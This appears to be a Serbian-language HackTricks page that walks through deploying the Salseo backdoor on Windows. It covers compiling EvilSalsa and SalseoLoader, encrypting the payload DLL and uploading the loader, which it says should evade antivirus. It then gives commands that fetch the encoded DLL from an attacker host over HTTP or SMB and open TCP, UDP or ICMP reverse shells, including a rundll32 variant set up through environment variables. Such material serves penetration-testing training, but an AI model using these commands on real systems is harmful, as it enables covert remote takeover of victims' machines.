# Salseo

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kompajliranje binarnih fajlova

Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Trebaće vam **Visual Studio** instaliran da biste kompajlirali kod.

Kompajlirajte ove projekte za arhitekturu Windows sistema na kojem ćete ih koristiti (Ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).

Možete **izabrati arhitekturu** unutar Visual Studio-a u **levom "Build" Tab-u** u **"Platform Target".**

(\*\*Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Zatim, izgradite oba projekta (Build -> Build Solution) (Unutar logova će se pojaviti putanja izvršnog fajla):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Priprema Backdoor-a

Prvo, trebaće vam da enkodujete **EvilSalsa.dll.** Da biste to uradili, možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:

### **Python**

```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```

### Windows

```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```

Sada imate sve što vam je potrebno da izvršite ceo Salseo postupak: **enkodirani EvilDalsa.dll** i **binarni fajl SalseoLoader.**

**Otpremite binarni fajl SalseoLoader.exe na mašinu. Ne bi trebalo da budu otkriveni od strane bilo kog AV...**

## **Izvršite backdoor**

### **Dobijanje TCP reverznog shell-a (preuzimanje enkodiranog dll-a putem HTTP-a)**

Zapamtite da pokrenete nc kao osluškivač reverznog shella i HTTP server da poslužuje enkodirani evilsalsa.

```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```

### **Dobijanje UDP obrnutog školjka (preuzimanje enkodovanog dll-a preko SMB-a)**

Zapamtite da treba pokrenuti nc kao osluškivač obrnutog školjka, i SMB server da služi enkodovani evilsalsa (impacket-smbserver).

```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```

### **Dobijanje ICMP reverse shell (enkodirani dll već unutar žrtve)**

**Ovog puta vam je potreban poseban alat na klijentu da primi reverse shell. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Onemogućavanje ICMP odgovora:**

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

#### Izvršite klijenta:

```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```

#### Unutar žrtve, izvršimo salseo stvar:

```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```

## Kompajliranje SalseoLoader-a kao DLL izvođenjem glavne funkcije

Otvorite projekat SalseoLoader koristeći Visual Studio.

### Dodajte pre glavne funkcije: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instalirajte DllExport za ovaj projekat

#### **Alati** --> **NuGet Package Manager** --> **Upravljanje NuGet paketima za rešenje...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Pretražite DllExport paket (koristeći karticu Pretraži) i pritisnite Instaliraj (i prihvatite iskačući prozor)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

U vašem projekt folderu pojavili su se fajlovi: **DllExport.bat** i **DllExport\_Configure.bat**

### **De**instalirajte DllExport

Pritisnite **Deinstaliraj** (da, čudno je, ali verujte mi, neophodno je)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Izađite iz Visual Studio-a i izvršite DllExport\_configure**

Jednostavno **izađite** iz Visual Studio-a

Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport\_Configure.bat**

Izaberite **x64** (ako ćete ga koristiti unutar x64 okvira, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Otvorite projekat ponovo sa Visual Studio-om**

**\[DllExport]** više ne bi trebalo da bude označen kao greška

![](<../.gitbook/assets/image (8) (1).png>)

### Izgradite rešenje

Izaberite **Tip izlaza = Biblioteka klasa** (Projekat --> SalseoLoader Properties --> Application --> Tip izlaza = Biblioteka klasa)

![](<../.gitbook/assets/image (10) (1).png>)

Izaberite **x64 platformu** (Projekat --> SalseoLoader Properties --> Build --> Ciljna platforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Da biste **izgradili** rešenje: Build --> Izgradi rešenje (Unutar konzole za izlaz pojaviće se putanja nove DLL datoteke)

### Testirajte generisanu Dll

Kopirajte i nalepite Dll gde želite da je testirate.

Izvršite:

```
rundll32.exe SalseoLoader.dll,main
```

Ako se ne pojavi greška, verovatno imate funkcionalnu DLL!!

## Dobijanje shell-a korišćenjem DLL-a

Ne zaboravite da koristite **HTTP server** i postavite **nc listener**

### Powershell

```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

### CMD

### Командна линија

```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
